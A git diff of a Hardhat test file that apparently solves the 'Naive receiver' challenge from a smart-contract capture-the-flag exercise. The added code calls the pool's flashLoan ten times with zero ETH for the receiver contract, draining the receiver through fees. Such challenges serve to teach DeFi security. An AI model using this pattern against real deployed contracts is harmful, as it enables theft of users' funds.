@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Naive receiver', function () {
+describe.only('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
 
     // Pool has 1000 ETH in balance
@@ -30,7 +30,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+    for(let i=0;i<10;i++){
+    await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+}
+
     });
 
     after(async function () {
